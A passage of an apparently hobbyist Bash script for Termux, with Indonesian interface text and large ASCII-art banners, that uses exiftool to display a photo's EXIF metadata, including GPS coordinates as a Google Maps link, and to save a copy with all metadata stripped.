        local lat_dec=$(exiftool -n -s3 -GPSLatitude "$file")
        local lon_dec=$(exiftool -n -s3 -GPSLongitude "$file")
        
        # Format URL Google Maps
        # Note: Di Termux/Bash, link ini harus di-copy secara manual karena Termux tidak membuka browser secara default
        local maps_url="https://www.google.com/maps/search/?api=1&query=$lat_dec,$lon_dec"

        echo -e "${GREEN}${BOLD}Posisi GPS:${RESET}\t$lat_dec, $lon_dec"
        echo -e "${GREEN}${BOLD}Link Google Maps:${RESET}"
        echo -e "${CYAN}$maps_url${RESET}"
        
        # Tampilkan data GPS mentah lainnya (Date, Time, Altitude)
        exiftool "$file" | grep -E '^(GPS Date Stamp|GPS Time Stamp|GPS Altitude)' | awk '
        BEGIN { FS=": "; OFS="\t" }
        {
            tag = $1
            val = $2
            gsub(/^[ \t]+|[ \t]+$/, "", tag)
            gsub(/^[ \t]+|[ \t]+$/, "", val) 
            print tag ":", val
        }
        ' | sed "s/^/${GREEN}${BOLD}/; s/: /:${RESET}\t/"
        
    else
        echo -e "${RED}[ ! ] GPS / LOKASI TIDAK DI TEMUKAN DI EXIF FOTO${RESET}"
    fi

    echo
    echo -e "${YELLOW} DITAIL LENGKAP --> 4 ${RESET}"
    echo -e "${BLUE}TEKAN ENTER UNTUK KEMBALI KE MENU${RESET}"
    read -r
}

# --- Fungsi Hapus EXIF (Strip & Simpan Baru) ---
strip_exif() {
clear
    local file=$1
    if [[ ! -f "$file" ]]; then
        echo -e "${RED}File tidak ditemukan: $file${RESET}"
        return
    fi
    clear
                    echo -e "
                            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠴⠒⠃⠉⠁⠒⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⣀⣠⣴⣆⡤⠦⢄⠀⠀⠀⠀⠀⣾⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⣿⣿⣀⣀⣸⠇⠀⠀⠀⡀⢸⣆⠀⠀⠉⠑⠢⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢽⡞⠓⣿⢷⣄⠀⠀⢀⡼⢀⠏⢸⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⡶⠶⠶⠤⠤⣤⣤⣤⣤⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠸⣤⡴⠁⠀⢉⣇⣠⠟⣡⡎⠀⢸⠀⠀⢀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀
        ⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠹⣆⠀⠀⠀⠀⠀⢀⡇⢱⣶⣾⢛⣉⣻⣉⢹⠉⠉⠋⠀⠀⢘⡆⠀⠀⠀⢀⣤⠀⢳⠀⠀⠀⠀⠀
        ⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⢀⡇⢸⡿⠿⠿⠿⠿⣿⣿⡤⠤⠤⢤⠀⠀⢷⣠⠀⣠⣿⠏⠀⠀⢧⠀⠀⠀⠀
        ⠘⠓⠒⠒⠷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⠤⠶⣶⠾⠗⠺⣄⣀⣀⣐⣮⣿⡶⣒⡉⠁⠘⣷⣀⣘⣿⣞⣡⢔⣂⣀⣀⡘⡄⠀⠀⠀
        ⠀⠀⠀⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⠤⢼⣇⣀⣀⠀⠈⡇⠀⠀⡟⢯⠤⠤⠀⠀⣿⣏⠙⢯⠉⠛⠍⠉⠉⠉⠙⢧⠀⠀⠀
⠀       ⠀⠀⠀⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣾⣿⣿⣿⠟⠻⠶⢶⣇⣬⠿⠶⢶⣾⣿⠏⠀⣸⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⠀
⠀⠀      ⠀⠀⠀⠀⠀⠀⠙⠢⠤⣀⣀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⡷⠶⠾⠛⠋⠀⠀⠀⠈⠙⠒⠓⠒⠂⠠⠤⠤⠤⠤⢼⣁⣀⠀
⠀⠀      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠒⠲⠦⢤⣤⣽⣏⡙⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸" | lolcat -p 0.7
    echo -e "${YELLOW}!!! PERINGATAN: Operasi ini akan membuat salinan baru file tanpa metadata EXIF. !!!${RESET}"
    echo -e "${CYAN}Menghapus semua metadata dari: ${BOLD}$file${RESET}"
    echo
    
    # Perintah exiftool untuk menghapus semua metadata (all=) dan menyimpan ke file baru (-o)
    local stripped_file="${file%.*}_stripped.${file##*.}"
    exiftool -all= -o "$stripped_file" "$file"
    
    if [ $? -eq 0 ]; then
        echo
        echo -e "${GREEN}[ ✓ ] Berhasil! File 'stripped' disimpan sebagai:${RESET}"
        echo -e "${GREEN}${BOLD}$stripped_file${RESET}"
        echo -e "Metadata EXIF telah dihapus dari file baru ini."
    else
        echo -e "${RED}[ ∅ ] Gagal menghapus metadata. Periksa izin file atau pastikan exiftool terinstal.${RESET}"
    fi

    echo
    echo -e "${BLUE}TEKAN ENTER UNTUK KEMBALI KE MENU${RESET}"
    read -r
}

# --- Fungsi Utama Menu ---
exif_menu() {
    local file=""

    while true; do
    clear
                    echo -e "
${RED}        ⠀⠀⠀⠀⠀⠀⢀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀
${RED}        ⠀⠀⠀⠀⠀⣰⠟⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡻⣧⠀⠀⠀⠀⠀
${RED}        ⠀⠀⠀⠀⣰⡇⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠘⣧⠀⡀⠀⠀
${RED}        ⠀⠀⠀⣰⡏⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸⣧⠀⠀⠀
${RED}        ⠀⠀⢰⠃⢸⠄⠘⡄⠀⠀⠀⠀⠀⠀ ⠀DANXY TO${WHITE}${BOLD}OLS V8.4        ⢀⡇⠀⢾⠈⣧⠀⠀
${RED}        ⠀⠀⢸⡄⢸⣄⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⢀⡏⢀⣟⠀⠀
${RED}        ⠀⢠⠿⡇⠈⣿⡀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⣽⠇⢀⡟⡆⠀
${RED}        ⠀⢸⠀⢻⠂⠸⣷⡀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⢀⣼⡟⠀⡺⠀⣹⠀
${RED}        ⠀⣼⡃⢸⣷⠄⢹⣿⣆⠸⣏⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢡⡇⢀⣿⣯⠀⣴⡗⠀⣿⡀
${RED}        ⢸⡇⢷⣄⠹⣷⣬⣿⣿⡛⠻⣆⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠚⠁⢀⡿⠛⣻⡿⢡⣼⠟⢀⡼⠁⡇
${RED}        ⠀⢳⡀⣷⣄⡸⣿⣮⣿⣷⡀⠙⣶⣄⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣀⣴⠏⠀⣾⣿⣥⣿⠏⣀⣼⠁⡼⠃
${RED}        ⠀⠈⣯⠈⢿⣦⡘⣿⡄⠙⢦⣀⢽⣿⣿⠶⠄⠀⠹⡄⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⢠⡞⠁⠠⠶⣾⣿⡿⢁⡴⠛⢁⣼⠁⣴⡿⠋⣸⠇⠀
${RED}        ⠀⠀⢸⠻⣆⠙⣿⣿⣿⣆⠀⢻⣷⣾⣿⣅⠀⠀⠀⣱⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⢸⠀⠀⠀⢀⣽⣷⣾⡟⠀⢀⣾⣿⣿⠋⣐⡾⣻⠀⠀
${RED}        ⠀⠀⠈⢧⡈⢿⣬⣽⣿⣉⠙⢲⣮⣽⡇⠀⠀⢀⡞⠃⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠈⠳⡆⠀⠀⢰⣿⣵⡶⠚⢉⣹⣟⣡⣼⠏⣠⠃⠀⠀
${RED}        ⠀⠀⠀⠘⢷⣄⡉⠻⣿⣿⣥⣤⣿⣿⣿⡋⠀⠈⠳⣄⡀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⣠⠾⠃⠀⢘⣿⣿⣿⣤⣤⣿⣿⠟⠋⣀⡴⠏⠀⠀⠀
${RED}        ⠀⠀⠀⠀⠀⠈⠙⠒⢬⡿⠋⠀⠀⣘⣿⣷⡟⠀⠀⠀⢳⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⣸⠁⠀⠀⢘⣾⣿⣇⡀⠀⠈⢻⡯⠔⠚⠉⠀⠀⠀⠀⠀
${RED}        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠷⢤⡞⠉⠀⣩⣿⣿⣾⠀⠀⠈⢣⠀⠀${WHITE}${BOLD}⠀⠀⣰⠃⠀⡀⢻⣿⣿⣯⡀⠉⠓⡦⠽⠇⠀⠀⠀⠀⠀⠀⠀⠀
${RED}        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣠⠞⠁⣰⠻⣿⣿⡧⠤⢌⣱⠄${WHITE}${BOLD}⠀⢾⡁⠤⢤⡿⣿⠟⢧⠀⠙⣦⣾⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣦⣧⣤⣏⣼⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⢳⣜⣧⣬⣧⣶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⠉⠁⠀⠀⠀⠀⠀${WHITE}${BOLD}⠀⠀⠀⠀⠀⠈⠉⢉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

${RED}               █▀▀ ▀▄▀ █ █▀▀   ▀█▀ █▀█ █▀█ █   █▀${WHITE}${BOLD}
               ██▄ █ █ █ █▀     █  █▄█ █▄█ █▄▄ ▄█
                ${GREEN}DANXY TOOLS V8.4${GREEN}   CODE BY DANXY${RESET}"
        
        if [[ -n "$file" && -f "$file" ]]; then
            echo -e "${RED}╭━━━━━${GREEN}[ ${BOLD}${RED}INFORMASI FILE ${GREEN}]${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
            echo -e "${RED}${BOLD}│${RESET}${BOLD}File Saat Ini: ${GREEN}$file${RED}"
            echo -e "${RED}${RED}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
        else
            echo -e "${RED}╭━━━━━${GREEN}[ ${RED}INFORMASI FILE ${GREEN}]${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
            echo -e "${RED}│${RESET}${BOLD}File Saat Ini: ${WHITE}${YELLOW}BELUM DIMUAT${RESET}"
            echo -e "${RED}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
        fi
        
        echo -e "${RED}╭━━━━━━${GREEN}[ ${RED}PILIH MENU${GREEN} ]${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮${RESET}"
        echo -e "${RED}│  ${BOLD}${GREEN}1.${RESET} ${BOLD}Muat/Pilih File Gambar Baru"
        echo -e "${RED}│  ${BOLD}${GREEN}2.${RESET} ${BOLD}Tampilkan Metadata EXIF (Ringkasan Lengkap + Maps)"
        echo -e "${RED}│  ${BOLD}${GREEN}3.${RESET} ${BOLD}Hapus Metadata EXIF (Strip & Simpan Baru)"
        echo -e "${RED}│  ${BOLD}${GREEN}4.${RESET} ${BOLD}Tampilkan Metadata EXIF (Detail Lengkap JSON/TXT)"
        echo -e "${RED}│  ${BOLD}${GREEN}5.${RESET} ${BOLD}Keluar"
        echo -e "${RED}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
        echo
#        read -r -p "$(echo -e "${BLUE}Pilih opsi (1-5): ${RESET}")" choice
        printf "${GREEN} ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}EXIF TOOLS${YELLOW}${RED}]${NC}${GREEN}\n ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
        read -r choice

        case "$choice" in
            1)
            clear
                            echo -e "${RED}
        ⠀⠀⠀⠀⠀⠀⢀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⣰⠟⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡻⣧⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⣰⡇⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠘⣧⠀⡀⠀⠀
        ⠀⠀⠀⣰⡏⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸⣧⠀⠀⠀
        ⠀⠀⢰⠃⢸⠄⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⢾⠈⣧⠀⠀
        ⠀⠀⢸⡄⢸⣄⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⢀⡏⢀⣟⠀⠀
        ⠀⢠⠿⡇⠈⣿⡀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⣽⠇⢀⡟⡆⠀
        ⠀⢸⠀⢻⠂⠸⣷⡀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⢀⣼⡟⠀⡺⠀⣹⠀
        ⠀⣼⡃⢸⣷⠄⢹⣿⣆⠸⣏⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢡⡇⢀⣿⣯⠀⣴⡗⠀⣿⡀
        ⢸⡇⢷⣄⠹⣷⣬⣿⣿⡛⠻⣆⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠚⠁⢀⡿⠛⣻⡿⢡⣼⠟⢀⡼⠁⡇
        ⠀⢳⡀⣷⣄⡸⣿⣮⣿⣷⡀⠙⣶⣄⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣀⣴⠏⠀⣾⣿⣥⣿⠏⣀⣼⠁⡼⠃
        ⠀⠈⣯⠈⢿⣦⡘⣿⡄⠙⢦⣀⢽⣿⣿⠶⠄⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠠⠶⣾⣿⡿⢁⡴⠛⢁⣼⠁⣴⡿⠋⣸⠇⠀
        ⠀⠀⢸⠻⣆⠙⣿⣿⣿⣆⠀⢻⣷⣾⣿⣅⠀⠀⠀⣱⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢀⣽⣷⣾⡟⠀⢀⣾⣿⣿⠋⣐⡾⣻⠀⠀
        ⠀⠀⠈⢧⡈⢿⣬⣽⣿⣉⠙⢲⣮⣽⡇⠀⠀⢀⡞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡆⠀⠀⢰⣿⣵⡶⠚⢉⣹⣟⣡⣼⠏⣠⠃⠀⠀
        ⠀⠀⠀⠘⢷⣄⡉⠻⣿⣿⣥⣤⣿⣿⣿⡋⠀⠈⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠃⠀⢘⣿⣿⣿⣤⣤⣿⣿⠟⠋⣀⡴⠏⠀⠀⠀
        ⠀⠀⠀⠀⠀⠈⠙⠒⢬⡿⠋⠀⠀⣘⣿⣷⡟⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⢘⣾⣿⣇⡀⠀⠈⢻⡯⠔⠚⠉⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠷⢤⡞⠉⠀⣩⣿⣿⣾⠀⠀⠈⢣⠀⠀⠀⠀⣰⠃⠀⡀⢻⣿⣿⣯⡀⠉⠓⡦⠽⠇⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣠⠞⠁⣰⠻⣿⣿⡧⠤⢌⣱⠄⠀⢾⡁⠤⢤⡿⣿⠟⢧⠀⠙⣦⣾⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣦⣧⣤⣏⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⣜⣧⣬⣧⣶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RESET}"
                echo -e "${RED}╭━━━━━${GREEN}[ ${BOLD}${RED}MASUKAN PATH ${GREEN}]${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
                echo -e "│${RESET}MASUKAN PATH FILE FOTO DI TEMPATKAN SEPERTI CONTOH DI BAWAH${RED}│"
                echo -e "${RED}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
                read -r -p "$(echo -e "${CYAN}MASUKAN PATH FOTO (misal: /sdcard/DCIM/foto.jpg): ${RESET}")" new_file
                if [[ -f "$new_file" ]]; then
                    file="$new_file"
                    echo -e "${GREEN}File berhasil dimuat: $file${RESET}"
                else
                    echo -e "${RED}File tidak ditemukan. Silakan coba lagi.${RESET}"
                fi
                sleep 2
                ;;
            2)
                if [[ -f "$file" ]]; then
                    show_exif "$file"
                else
                    echo -e "${RED}Silakan muat file terlebih dahulu (Opsi 1).${RESET}"
                    sleep 2
                fi
                ;;
            3)
                if [[ -f "$file" ]]; then
                    strip_exif "$file"
                else
                    echo -e "${RED}Silakan muat file terlebih dahulu (Opsi 1).${RESET}"
                    sleep 2
                fi
                ;;
            4)
                if [[ -f "$file" ]]; then
                clear
                                echo -e "${RED}
        ⠀⠀⠀⠀⠀⠀⢀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⣰⠟⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡻⣧⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⣰⡇⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠘⣧⠀⡀⠀⠀
        ⠀⠀⠀⣰⡏⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸⣧⠀⠀⠀
        ⠀⠀⢰⠃⢸⠄⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⢾⠈⣧⠀⠀
        ⠀⠀⢸⡄⢸⣄⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⢀⡏⢀⣟⠀⠀
        ⠀⢠⠿⡇⠈⣿⡀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⣽⠇⢀⡟⡆⠀
        ⠀⢸⠀⢻⠂⠸⣷⡀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⢀⣼⡟⠀⡺⠀⣹⠀
        ⠀⣼⡃⢸⣷⠄⢹⣿⣆⠸⣏⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢡⡇⢀⣿⣯⠀⣴⡗⠀⣿⡀
        ⢸⡇⢷⣄⠹⣷⣬⣿⣿⡛⠻⣆⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠚⠁⢀⡿⠛⣻⡿⢡⣼⠟⢀⡼⠁⡇
        ⠀⢳⡀⣷⣄⡸⣿⣮⣿⣷⡀⠙⣶⣄⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣀⣴⠏⠀⣾⣿⣥⣿⠏⣀⣼⠁⡼⠃
        ⠀⠈⣯⠈⢿⣦⡘⣿⡄⠙⢦⣀⢽⣿⣿⠶⠄⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠠⠶⣾⣿⡿⢁⡴⠛⢁⣼⠁⣴⡿⠋⣸⠇⠀
        ⠀⠀⢸⠻⣆⠙⣿⣿⣿⣆⠀⢻⣷⣾⣿⣅⠀⠀⠀⣱⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢀⣽⣷⣾⡟⠀⢀⣾⣿⣿⠋⣐⡾⣻⠀⠀
        ⠀⠀⠈⢧⡈⢿⣬⣽⣿⣉⠙⢲⣮⣽⡇⠀⠀⢀⡞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡆⠀⠀⢰⣿⣵⡶⠚⢉⣹⣟⣡⣼⠏⣠⠃⠀⠀
        ⠀⠀⠀⠘⢷⣄⡉⠻⣿⣿⣥⣤⣿⣿⣿⡋⠀⠈⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠃⠀⢘⣿⣿⣿⣤⣤⣿⣿⠟⠋⣀⡴⠏⠀⠀⠀
        ⠀⠀⠀⠀⠀⠈⠙⠒⢬⡿⠋⠀⠀⣘⣿⣷⡟⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⢘⣾⣿⣇⡀⠀⠈⢻⡯⠔⠚⠉⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠷⢤⡞⠉⠀⣩⣿⣿⣾⠀⠀⠈⢣⠀⠀⠀⠀⣰⠃⠀⡀⢻⣿⣿⣯⡀⠉⠓⡦⠽⠇⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣠⠞⠁⣰⠻⣿⣿⡧⠤⢌⣱⠄⠀⢾⡁⠤⢤⡿⣿⠟⢧⠀⠙⣦⣾⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣦⣧⣤⣏⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⣜⣧⣬⣧⣶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RESET}"
                #    echo -e "${CYAN}INFORMASI FOTO: ${BOLD}$file${RESET}${CYAN} ---${RESET}"
                 #   echo -e "${YELLOW}Output berikut sangat detail. Scroll ke atas untuk melihat semuanya.${RESET}"
                    echo -e "${RED}╭━━━━━${GREEN}[ ${BOLD}${RED}MASUKAN PATH ${GREEN}]${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
                    echo -e "│${RESET}INFORMASI  EXIF FOTO LENGKAP DI BAWAH INI SCROL AGAR JELAS${RED} │"
